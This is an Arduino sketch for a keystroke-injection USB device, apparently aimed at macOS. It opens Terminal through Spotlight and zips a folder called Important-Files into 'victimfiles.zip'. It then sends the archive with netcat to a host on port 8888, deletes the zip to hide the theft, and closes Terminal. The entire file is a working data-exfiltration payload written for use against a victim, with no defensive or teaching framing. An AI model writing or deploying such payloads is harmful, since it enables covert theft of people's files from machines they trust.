#include <HID-Project.h>
#include <HID-Settings.h>

void setup()
{
  // Start Keyboard
  Keyboard.begin();

  // Start Payload
  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(' ');
  Keyboard.releaseAll();

  delay(500);

  Keyboard.print("terminal");

  delay(1000);

  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);

  delay(5000);

  Keyboard.print("zip -r victimfiles.zip Important-Files -x Important-Files/.*");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(8000);

  Keyboard.print("nc 192.168.8.120 8888 < victimfiles.zip");

  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);

  delay(30000);
  
  Keyboard.print("rm victimfiles.zip");
  
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(113);
  Keyboard.releaseAll();

  // End Payload

  // Stop Keyboard
  Keyboard.end();
}

// Unused
void loop() {}
